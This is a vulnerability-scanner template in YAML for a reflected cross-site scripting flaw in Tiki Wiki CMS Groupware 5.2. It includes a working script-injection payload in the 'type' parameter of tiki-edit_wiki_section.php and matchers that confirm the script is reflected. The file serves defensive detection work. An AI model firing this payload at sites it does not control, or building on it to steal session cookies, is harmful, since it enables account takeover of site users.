id: "tikiwiki-reflected-xss"
name: "Tiki Wiki CMS Groupware 5.2 - Cross-Site Scripting"
severity: "high"
description: "Tiki Wiki CMS Groupware 5.2 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks."
tech:
  - "php"
tags:
  - "packetstorm"
  - "edb"
  - "xss"
  - "tikiwiki"
  - "vuln"
cwe: "CWE-79"
reference: "https://packetstormsecurity.com/files/94255/Tiki-Wiki-CMS-Groupware-5.2-Cross-Site-Scripting.html"
spaExclusion: true
request:
  method: "GET"
  path: "/tiki-5.2/tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "status"
    status:
      - 200
  - type: "word"
    part: "body"
    words:
      - "<script>alert(31337)</script>"
  - type: "word"
    part: "header"
    words:
      - "text/html"
